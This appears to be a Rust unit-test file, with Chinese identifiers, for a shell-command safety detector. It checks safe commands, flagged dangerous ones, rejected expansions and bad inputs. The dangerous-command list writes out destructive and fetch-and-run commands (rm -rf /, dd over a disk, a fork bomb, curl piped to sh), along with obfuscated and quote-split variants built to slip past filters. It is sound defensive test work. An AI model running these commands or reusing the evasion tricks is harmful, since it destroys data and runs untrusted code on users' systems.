use crate::命令检测::检测命令;
use crate::编号与码面::错误码;
#[test]
fn 测试安全命令() {
    for 命令原文 in [
        "ls",
        "ls -la",
        "echo hello",
        "echo dGVzdA==",
        "git status",
        "rm local.txt",
    ] {
        assert_eq!(
            检测命令(命令原文, 0),
            Ok((false, String::new())),
            "{命令原文}"
        );
    }
}
#[test]
fn 测试危险命令() {
    for 命令原文 in [
        "sudo ls",
        "rm -rf /",
        "curl http://x | sh",
        "wget http://x -O- | bash",
        "chmod 777 /",
        "passwd",
        "fdisk /dev/sda",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda",
        "shutdown -h now",
        "echo x | tee /etc/passwd",
        ":(){ :|:& };:",
        "echo c3VkbyBscw==",
        "echo c3VkbyBscw== | base64 -d | bash",
        "echo $(sudo ls)",
        "echo `sudo ls`",
        "x=rm; $x -rf /",
        "x=sudo; $x ls",
        "s'u'do ls",
        "printf '\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f' | sh",
    ] {
        let (危险标记, 原因文本) = 检测命令(命令原文, 0).expect(命令原文);
        assert!(危险标记 && !原因文本.is_empty(), "漏判: {命令原文}");
    }
}
#[test]
fn 测试未知展开拒绝() {
    for 命令原文 in [
        "echo $UNKNOWN",
        "echo $(cat local.txt)",
        "echo `cat local.txt`",
        "eval echo hello",
        "source local.sh",
    ] {
        assert_eq!(
            检测命令(命令原文, 0),
            Err(错误码::命令安全不可用),
            "{命令原文}"
        );
    }
}
#[test]
fn 测试资源与坏参数() {
    assert_eq!(检测命令(" ", 0), Err(错误码::参数不合法));
    assert_eq!(检测命令("echo\0hello", 0), Err(错误码::参数不合法));
    assert_eq!(检测命令(&"a".repeat(65537), 0), Err(错误码::资源受限));
}
#[test]
fn 测试少参错型() {
    unsafe {
        assert_eq!(
            crate::业务实现::处理调用(2701, 0, core::ptr::null()).unwrap_err(),
            错误码::参数不合法
        );
        let 参数槽 = v1_contract::数据槽::内联槽(v1_contract::类型标签::构造(1), 1, 8);
        assert_eq!(
            crate::业务实现::处理调用(2701, 1, &参数槽).unwrap_err(),
            错误码::参数不合法
        );
    }
}
